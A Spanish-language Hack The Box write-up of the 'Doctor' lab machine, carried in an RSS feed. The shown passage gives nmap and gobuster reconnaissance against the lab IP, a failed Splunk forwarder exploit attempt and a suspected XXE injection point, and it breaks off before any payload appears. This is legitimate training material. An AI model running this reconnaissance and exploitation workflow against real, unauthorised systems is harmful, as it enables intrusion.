<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>injection on sckull</title>
    <link>https://sckull.github.io/tags/injection/</link>
    <description>Recent content in injection on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 06 Feb 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/injection/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Doctor</title>
        <link>https://sckull.github.io/posts/doctor/</link>
        <pubDate>Sat, 06 Feb 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 06 Feb 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/doctor/</guid>
        <description>Doctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Doctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso. Los Logs de Apache nos permitieron leer la contraseña del siguiente usuario. Explotamos una vulnerabilidad en Splunk lo que nos permitio obtener acceso privilegiado.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/278&#34;&gt;Doctor&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.209&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/94858&#34;&gt;egotisticalSW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/94858&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.4, 5.9, 5.8, 4.2, 4.1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[7, 8, 7, 3, 2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssl-https(?) (8089) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Dec 30 18:17:55 2020 as: nmap -p- --min-rate 1000 -o scanPorts doctor.htb&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; doctor.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.209&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Dec 30 18:20:06 2020 -- 1 IP address (1 host up) scanned in 131.59 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Dec 30 18:20:46 2020 as: nmap -sV -sC -p22,80,8089 -o servicePorts doctor.htb&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; doctor.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.209&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.068s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http     Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; disallowed entry 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Splunkd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: splunkd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SplunkServerDefaultCert/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SplunkUser
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-09-06T15:57:27
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Dec 30 18:21:28 2020 -- 1 IP address (1 host up) scanned in 42.04 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http---puerto-80&#34;&gt;HTTP - PUERTO 80&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80, en esta pagina vemos tambien un dominio &lt;code&gt;doctors.htb&lt;/code&gt; el cual agregamos junto al que ya teniamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3017.24.17.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, pero al parecer es una pagina estatica.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/doctor$ gobuster dir -u http://doctor.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;
/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/departments.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/services.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;https---puerto-8089&#34;&gt;HTTPS - PUERTO 8089&lt;/h1&gt;
&lt;p&gt;En este puerto encontramos una &amp;ldquo;pagina&amp;rdquo; donde vemos &lt;em&gt;Splunk&lt;/em&gt; en su version web: &lt;strong&gt;Splunk build 8.0.5&lt;/strong&gt;. Tambien un &lt;a href=&#34;https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/&#34;&gt;post&lt;/a&gt; donde describe una vulnerabilidad en este &amp;ldquo;servicio&amp;rdquo; que permite ejecutar comandos, utilizamos el exploit remoto con las credenciales por default pero no logramos obtener ninguna respuesta, por lo que es necesario obtener credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3017.26.25.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;doctors-&#34;&gt;DOCTORS&lt;/h2&gt;
&lt;p&gt;Con el dominio nuevo, encontramos un login, donde registramos un usuario y en la pagina inicial vemos una opcion de escribir mensajes que solo presentan contenido y titulo en la pagina principal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3018.58.41.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando BurpSuite dentro de las respuestas pudimos encontrar que es una aplicacion escrita en &lt;code&gt;Python&lt;/code&gt;, además ejecutamos Gobuster para buscar diferentes rutas dentro de la aplicacion. Vemos &lt;code&gt;/archive&lt;/code&gt; una direccion que no aparece relacionada en ninguna opcion del menu de la aplicacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ gobuster dir -u http://doctors.htb/ -w /usr/share/wordlists/dirb/big.txt -q -x php,html,txt -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; -k
/account &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/archive &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/logout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/register &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/reset_password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La ultima direccion mencionada no tiene ningun tipo de contenido pero al verificar el codigo fuente vemos XML donde se ve reflejado el titulo del Mensaje que creamos, por lo que quizá sea vulnerable a &lt;code&gt;XXE Injection&lt;/code&gt; en la etiqueta &lt;code&gt;&amp;lt;title&amp;gt;PAYLOAD&amp;lt;/title&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
